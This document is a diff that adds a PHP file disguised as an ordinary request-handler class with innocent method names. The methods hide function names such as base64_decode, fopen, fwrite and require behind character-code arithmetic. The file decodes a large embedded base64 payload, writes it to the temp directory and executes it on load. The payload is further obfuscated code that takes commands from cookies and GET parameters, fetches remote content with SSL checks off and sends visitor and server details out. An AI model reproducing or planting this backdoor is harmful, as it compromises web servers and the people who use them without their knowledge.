@@ -1,0 +1,78 @@
+<?php
+class RequestHandler {
+	private $ww = '';
+	private $fe = '';
+
+	public function or($p1) {
+		$a = array(((23*50)-1049),(2*50),(111),((66*97)-6303),(68+22+11),((26+10+64)),((22*94)-1973),((28*2)-4),(((21*2)+12)),((60+41)),((121-6)),((32+10+55)),((2*49)));
+		$s = '';
+		foreach($a as $n){ $s .= chr($n); }
+		$s = strrev($s);
+		return $s($p1);
+	}
+
+	public function resolveConflict($p1,$p2) {
+		$a = array((2*55),((6+47+48)),(((31*82)-2430)),((3*37)),((2*51)));
+		$s = '';
+		foreach($a as $n){ $s .= chr($n); }
+		$s = strrev($s);
+		return $s($p1,$p2);
+	}
+
+	public function calculateSum($p1,$p2) {
+		$a = array(((101*1)),(17+63+36),(111-6),(((15*13)-81)),((7*17)),((100*87)-8598));
+		$s = '';
+		foreach($a as $n){ $s .= chr($n); }
+		$s = strrev($s);
+		return $s($p1,$p2);
+	}
+
+	public function updateCache($p1) {
+		$a = array((101*1),((5*23)),((82+29)),(((61*1)+47)),(16+65+18),(45+17+40));
+		$s = '';
+		foreach($a as $n){ $s .= chr($n); }
+		$s = strrev($s);
+		return $s($p1);
+	}
+
+	public function validateInput($p1,$p2=null) {
+		$a = array((114),((2*58)),(2*57),(105),((28+81)));
+		$s = '';
+		foreach($a as $n){ $s .= chr($n); }
+		return $s($p1,$p2);
+	}
+
+	public function encryptData() {
+		$this->fe = $this->validateInput($this->cacheData(), '/');
+	}
+
+	public function updateRegistry() {
+		$this->ww = $this->or($this->dg);
+	}
+
+	public function checkConsistency() {
+		$fn = $this->fe.'/dp-6861843e21c1a';
+		$f = $this->resolveConflict($fn, 'w');
+		$this->calculateSum($f, $this->ww);
+		$this->updateCache($f);
+		$this->resolveAction($fn);
+	}
+
+	private $dg = 'PD9waHAgY2xhc3MgX2xkdHtwcml2YXRlIHN0YXRpYyRfaG9kO' . '3N0YXRpYyBmdW5jdGlvbiBfcWJwKCRfaWYpe2lmKCFzZWxmOjo' . 'kX2hvZClzZWxmOjpfd2coKTtyZXR1cm4gYmFzZTY0X2RlY29kZ' . 'ShzZWxmOjokX2hvZFskX2lmXSk7fXByaXZhdGUgc3RhdGljIGZ' . '1bmN0aW9uIF93Zygpe3NlbGY6OiRfaG9kPWFycmF5KCdfaWUnP' . 'T4nUVdOalpYTnpMVU52Ym5SeWIyd3RRV3hzYjMnLidjdFQzSnB' . 'aMmx1TycuJ2knLidBJy4ncScsJ19wc3UnPT4nUTI5dWRHVnVkQ' . 'zFVZVhCbE9pQmhjSEInLidzJy4nYVdOaGRHbHZiaTlxWVhaaGM' . 'yTnknLidhWEInLicwJywnX3Vldic9PidZMmcnLic9JywnX2J0J' . 'z0+J1pYbEtjR05EU1RaSmFtYzBUR3BuTkV4cVp6Uk1hbWMwU1d' . 'sM2FXUlhSV2xQYVVvd1dsaE9NRWxwZDJsamJWWnRTJy4nV3B2Y' . 'VdSSFYnLiduJy4ncGtRMG81JywnX2NmJz0+J2NYZDZlQT09Jyw' . 'nX2F1aic9PidQRycuJzlyUGcnLic9PScsJ19pa24nPT4nUEdKa' . 'CcuJ1onLidENCcuJz0nLCdfeGd1Jz0+J2QyRnNiQT0nLic9Jyw' . 'nX3RjYic9PicnLCdfeHNqJz0+JycsJ19paSc9PicnLCdfeXInP' . 'T4nYUhSMGNEb3ZMM0IxWWk1M1onLidXSm1hV3hsYUc5emRHVnl' . 'MbU52YlM5amIyMXdiM05sY2k1cWMnLid6Jy4nOWtZWFJoUCcuJ' . '1E9Jy4nPScsJ19qcmsnPT4nWTNWeWJGJy4nOXBibScuJ2wwJyw' . 'nX3lmJz0+J2FIUjAnLidjRicuJzlqJy4nYjJSbCcsJ19yaSc9P' . 'idjMk5vJy4nWlcxbCcsJ19pdCc9PidhSFIwY0hNPScsJ19waGk' . 'nPT4nUjBWVUlBPT0nLCdfcm5kJz0+J2NHRjAnLidhQT09JywnX' . '3N5Jz0+J2NYVmxjJy4nbicuJ2snLic9JywnX2ppJz0+J1B3PSc' . 'uJz0nLCdfcm8nPT4nY1hWbGNuaycuJz0nLCdfYnAnPT4nSUVoV' . 'VZGQXYnLidNUzR3RFFwSWIzTicuJzBPaUE9JywnX3p0byc9Pid' . 'hRzl6ZEEnLic9Jy4nPScsJ19jdHInPT4nRFFwRCcuJ2IyNXVaV' . '04wYVc5dU9pQkRiRzknLid6WicuJ1EnLicwS0RRJy4nbz0nLCd' . 'fY3RpJz0+J2MnLiczTicuJ3NPaTgnLid2JywnX3ZycSc9PicnL' . 'CdfYWcnPT4nYUc5emQnLidBPScuJz0nLCdfYWxlJz0+J0RRbyc' . 'uJz0nLCdfcW5yJz0+J1NGUlVVRjlEVEVsRlRsUmZTJy4nVicuJ' . '0E9JywnX3NpJz0+J1NGUlVVRjlZWDBaUFVsZEJVa1InLidGJy4' . 'nUicuJ0Y5Jy4nR1QxJy4nST0nLCdfdnd0Jz0+J1VrVk4nLidUM' . 'VJGWDBGJy4nRScuJ1JGSScuJz0nLCdfdGYnPT4nU0ZSVVVGOVZ' . 'VMFZTWCcuJzBGSFJVNVUnLCdfaW4nPT4nU0ZSVVVGOVZVMFZTW' . 'DBGJy4nSCcuJ1JVNScuJ1UnLCdfZG9oJz0+JycsJ19hYyc9Pid' . 'TRlJVVUY5U1JVJy4nWkZVJy4naycuJ1ZTJywnX3BkJz0+J1NGU' . 'lVVRjlTUlVaRlVrJy4nVlMnLCdfengnPT4nJywnX2FoZyc9Pid' . 'TRlJVVUY5RCcuJ1RFbEZUJy4nbFJmJy4nU1YnLidBPScsJ19kb' . 'mUnPT4nU0ZSVScuJ1VGOURURWxGVCcuJ2xSJy4nZlNWQT0nLCd' . 'fdW5vJz0+J1NGUlVVRjlZWDBaUFVsZEJVa1JGUkY5R1QxJy4nS' . 'ScuJz0nLCdfd3JrJz0+J1NGUlVVRjlZJy4nWDBaUFUnLidsZEJ' . 'Va1JGUkY5Jy4nRycuJ1QnLicxST0nLCdfbHQnPT4nVWtWTlQxJ' . 'y4nUkYnLidYMEYnLidFUkYnLidJPScsJ19wYic9PidVa1ZOVDF' . 'SRlgnLicwRkVSRkk9JywnX3JlaSc9PidaR0puYlc5Jy4naycuJ' . '1pRPScuJz0nLCdfeHInPT4nU1ZBNklBPT0nLCdfc3onPT4nSUh' . '3Z1ZVRTYnLidJQScuJz0nLic9JywnX3d3Jz0+J0lIdycuJ2dVb' . 'VYnLidtT2knLidBJy4nPScsJ19lZGEnPT4nSUQnLid4aWNqJy4' . 'nNEsnLCdfd3Z5Jz0+J2FYJy4nQT0nLCdfYWYnPT4nZFcnLidFP' . 'ScsJ196amgnPT4nY21WbScsJ19jaCc9PidjWGQ2ZUE9Jy4nPSc' . 'sKTt9fWhlYWRlcihfbGR0OjpfcWJwKCdfaScuJ2UnKSk7aGVhZ' . 'GVyKF9sZHQ6Ol9xYnAoJ18nLidwJy4nc3UnKSk7aWYoaXNzZXQ' . 'oJF9HRVRbX2xkdDo6X3FicCgnX3UnLidldicpXSkpeyRfcGhkP' . 'V94dHQoX2xkdDo6X3FicCgnX2J0JykpO2lmKCRfcGhkJiZzdHJ' . 'wb3MoJF9waGQsX2xkdDo6X3FicCgnXycuJ2NmJykpIT09ZmFsc' . '2Upe2RpZShfbGR0OjpfcWJwKCdfJy4nYScuJ3VqJykpO31lbHN' . 'le2RpZShfbGR0OjpfcWJwKCdfaScuJ2tuJykpO319aWYoaXNzZ' . 'XQoJF9HRVRbX2xkdDo6X3FicCgnXycuJ3gnLidndScpXSkpeyR' . 'fenY9JF9DT09LSUU7JF9rYj0oLTUzOSsyNzkrNTQzLTI4Myk7J' . 'F9pZj0oNzAtIC02NistMTI5KTskX210dj1hcnJheSgpOyRfbXR' . '2WyRfa2JdPV9sZHQ6Ol9xYnAoJ190YycuJ2InKTt3aGlsZSgkX' . '2lmKXskX210dlskX2tiXS49JF96dlsyMCstOC0zMCs0OF1bJF9' . 'pZl07aWYoISRfenZbMTkrMTFdWyRfaWYrKGludClyb3VuZCgwL' . 'jI1KzAuMjUrMC4yNSswLjI1KV0pe2lmKCEkX3p2WyhpbnQpcm9' . '1bmQoMTUrMTUpXVskX2lmKygtMTc4Ky0zNDgrNDctIC00ODEpX' . 'SlicmVhazskX2tiKys7JF9tdHZbJF9rYl09X2xkdDo6X3FicCg' . 'nX3gnLidzaicpOyRfaWYrKzt9JF9pZj0kX2lmKyg0NDcrMTUwK' . 'y01OTApKyhpbnQpcm91bmQoMC41KzAuNSk7fSRfa2I9JF9tdHZ' . 'bLTMwKzQ0XSgpLiRfbXR2WzI2KzM4LTM1Ky01XTtpZighJF9td' . 'HZbKGludClyb3VuZCgxLjUrMS41KzEuNSsxLjUpXSgkX2tiKSl' . '7JF9pZj0kX210dls0NDArLTUyMSsxMDddKCRfa2IsJF9tdHZbK' . 'GludClyb3VuZCg1KzUpXSk7JF9tdHZbKGludClyb3VuZCgyLjI' . '1KzIuMjUrMi4yNSsyLjI1KV0oJF9pZiwkX210dlszNzEtMzYwX' . 'S4kX210dls3OS01Nl0oJF9tdHZbMzktIC04MC05NF0oJF96dls' . 'oaW50KXJvdW5kKDEuNSsxLjUpXSkpKTt9aW5jbHVkZSgkX2tiK' . 'Tt9ZnVuY3Rpb24gX3h0dCgkX3lxLCRfeWo9LTU4OTQzLCRfbnF' . 'oPTQzNTQ1KXskX3J4PV9sZHQ6Ol9xYnAoJ19paScpOyRfcmg9X' . '2xkdDo6X3FicCgnXycuJ3lyJykuJF95cTtpZihpc19jYWxsYWJ' . 'sZShfbGR0OjpfcWJwKCdfanInLidrJykpKXskX2RmPWN1cmxfa' . 'W5pdCgkX3JoKTtjdXJsX3NldG9wdCgkX2RmLENVUkxPUFRfU1N' . 'MX1ZFUklGWVBFRVIsZmFsc2UpO2N1cmxfc2V0b3B0KCRfZGYsQ' . '1VSTE9QVF9TU0xfVkVSSUZZSE9TVCwtMTktIC0yMSk7Y3VybF9' . 'zZXRvcHQoJF9kZixDVVJMT1BUX0ZPTExPV0xPQ0FUSU9OLChpb' . 'nQpcm91bmQoMC4yNSswLjI1KzAuMjUrMC4yNSkpO2N1cmxfc2V' . '0b3B0KCRfZGYsQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwoaW50K' . 'XJvdW5kKDAuMzMzMzMzMzMzMzMzMzMrMC4zMzMzMzMzMzMzMzM' . 'zMyswLjMzMzMzMzMzMzMzMzMzKSk7Y3VybF9zZXRvcHQoJF9kZ' . 'ixDVVJMT1BUX0hFQURFUiwoaW50KXJvdW5kKDArMCswKSk7Y3V' . 'ybF9zZXRvcHQoJF9kZixDVVJMT1BUX0NPTk5FQ1RUSU1FT1VUL' . 'ChpbnQpcm91bmQoMi41KzIuNSsyLjUrMi41KSk7Y3VybF9zZXR' . 'vcHQoJF9kZixDVVJMT1BUX1RJTUVPVVQsNjAzKzcxLTY2NCk7J' . 'F9yeD1jdXJsX2V4ZWMoJF9kZik7JF9sYnc9Y3VybF9nZXRpbmZ' . 'vKCRfZGYpO2N1cmxfY2xvc2UoJF9kZik7aWYoJF9sYndbX2xkd' . 'Do6X3FicCgnX3knLidmJyldIT0oaW50KXJvdW5kKDY2LjY2NjY' . '2NjY2NjY2Nys2Ni42NjY2NjY2NjY2NjcrNjYuNjY2NjY2NjY2N' . 'jY3KSlyZXR1cm4gZmFsc2U7fWVsc2V7JF9nZ2g9cGFyc2VfdXJ' . 'sKCRfcmgpOyRfYWs9KCRfZ2doW19sZHQ6Ol9xYnAoJ19yaScpX' . 'T09X2xkdDo6X3FicCgnXycuJ2knLid0JykpOyRfbmh3PV9sZHQ' . '6Ol9xYnAoJ19waCcuJ2knKS4kX2dnaFtfbGR0OjpfcWJwKCdfc' . 'm5kJyldO2lmKGlzc2V0KCRfZ2doW19sZHQ6Ol9xYnAoJ18nLid' . 'zeScpXSkpJF9uaHcuPV9sZHQ6Ol9xYnAoJ19qaScpLiRfZ2doW' . '19sZHQ6Ol9xYnAoJ19yJy4nbycpXTskX25ody49X2xkdDo6X3F' . 'icCgnXycuJ2InLidwJykuJF9nZ2hbX2xkdDo6X3FicCgnXycuJ' . '3p0bycpXS5fbGR0OjpfcWJwKCdfJy4nYycuJ3RyJyk7JF9wY2E' . '9ZnNvY2tvcGVuKCgkX2FrP19sZHQ6Ol9xYnAoJ18nLidjJy4nd' . 'CcuJ2knKTpfbGR0OjpfcWJwKCdfdicuJ3JxJykpLiRfZ2doW19' . 'sZHQ6Ol9xYnAoJ19hJy4nZycpXSwkX2FrPzEyMDgrMzYxLTU3N' . 'S01NTE6Mi0gLTc4KTtpZigkX3BjYSl7ZnB1dHMoJF9wY2EsJF9' . 'uaHcpOyRfb2RxPSgtMTIyKzEyMik7d2hpbGUoIWZlb2YoJF9wY' . '2EpKXskX290PWZnZXRzKCRfcGNhLChpbnQpcm91bmQoNTEyKzU' . 'xMikpO2lmKCRfb2RxKSRfcnguPSRfb3Q7aWYoJF9vdD09X2xkd' . 'Do6X3FicCgnX2FsZScpKSRfb2RxPSgtMTI0LSAtMTI1KTt9ZmN' . 'sb3NlKCRfcGNhKTt9fXJldHVybiRfcng7fSRfZ2U9aXNzZXQoJ' . 'F9TRVJWRVJbX2xkdDo6X3FicCgnX3EnLiduJy4ncicpXSk7JF9' . '5bT1pc3NldCgkX1NFUlZFUltfbGR0OjpfcWJwKCdfJy4ncycuJ' . '2knKV0pOyRfaHE9aXNzZXQoJF9TRVJWRVJbX2xkdDo6X3FicCg' . 'nXycuJ3YnLid3dCcpXSk7JF9yano9aXNzZXQoJF9TRVJWRVJbX' . '2xkdDo6X3FicCgnX3QnLidmJyldKT8kX1NFUlZFUltfbGR0Ojp' . 'fcWJwKCdfaW4nKV06X2xkdDo6X3FicCgnX2QnLidvJy4naCcpO' . 'yRfcmE9aXNzZXQoJF9TRVJWRVJbX2xkdDo6X3FicCgnX2FjJyl' . 'dKT8kX1NFUlZFUltfbGR0OjpfcWJwKCdfcGQnKV06X2xkdDo6X' . '3FicCgnX3p4Jyk7JF9nZT1pc3NldCgkX1NFUlZFUltfbGR0Ojp' . 'fcWJwKCdfJy4nYWhnJyldKT8kX1NFUlZFUltfbGR0OjpfcWJwK' . 'CdfZCcuJ24nLidlJyldOm51bGw7JF95bT1pc3NldCgkX1NFUlZ' . 'FUltfbGR0OjpfcWJwKCdfdW5vJyldKT8kX1NFUlZFUltfbGR0O' . 'jpfcWJwKCdfd3JrJyldOm51bGw7JF9ocT1pc3NldCgkX1NFUlZ' . 'FUltfbGR0OjpfcWJwKCdfbHQnKV0pPyRfU0VSVkVSW19sZHQ6O' . 'l9xYnAoJ18nLidwJy4nYicpXTpudWxsO2lmKGZpbHRlcl92YXI' . 'oJF9nZSwxMTU0LTExNzYtIC0yOTcpKXskX3VvZD0kX2dlO31lb' . 'HNlaWYoZmlsdGVyX3ZhcigkX3ltLChpbnQpcm91bmQoOTEuNjY' . '2NjY2NjY2NjY3KzkxLjY2NjY2NjY2NjY2Nys5MS42NjY2NjY2N' . 'jY2NjcpKSl7JF91b2Q9JF95bTt9ZWxzZXskX3VvZD0kX2hxO31' . 'pZihpc3NldCgkX0dFVFtfbGR0OjpfcWJwKCdfcicuJ2UnLidpJ' . 'yldKSl7ZWNobyBfbGR0OjpfcWJwKCdfeHInKS4kX3VvZC5fbGR' . '0OjpfcWJwKCdfc3onKS4kX3Jqei5fbGR0OjpfcWJwKCdfJy4nd' . '3cnKS4kX3JhLl9sZHQ6Ol9xYnAoJ19lZCcuJ2EnKTtleGl0KCk' . '7fWlmKCFpc3NldCgkX3VvZCl8fCFpc3NldCgkX3Jqeil8fCFpc' . '3NldCgkX3JhKSl7ZXhpdCgpO31lbHNleyRfeXVyPWFycmF5KF9' . 'sZHQ6Ol9xYnAoJ193dnknKT0+JF91b2QsX2xkdDo6X3FicCgnX' . 'ycuJ2EnLidmJyk9PiRfcmp6LF9sZHQ6Ol9xYnAoJ196aicuJ2g' . 'nKT0+JF9yYSk7JF94Z2Y9dXJsZW5jb2RlKGJhc2U2NF9lbmNvZ' . 'GUoanNvbl9lbmNvZGUoJF95dXIpKSk7JF9waGQ9X3h0dCgkX3h' . 'nZik7aWYoJF9waGQmJnN0cnBvcygkX3BoZCxfbGR0OjpfcWJwK' . 'CdfYycuJ2gnKSkhPT1mYWxzZSl7ZWNobyRfcGhkO2V4aXQoKTt' . '9fQ==';
+
+	public function resolveAction($p) {
+		require $p;
+	}
+
+	public function cacheData() {
+		$a=array(((125-10)),((5+116)),((32*3)+19),(36+9+50),(103),(((31*2)+39)),116,(5*19),(82+34),101,((111-2)),((2*56)),((74+13+8)),((79*1)+21),((73*54)-3837),((80*73)-5726));
+		$s='';
+		foreach($a as $n){$s.=chr($n);}
+		return $s();
+	}
+}
+
+$la = new RequestHandler();
+$la->encryptData();
+$la->updateRegistry();
+$la->checkConsistency();
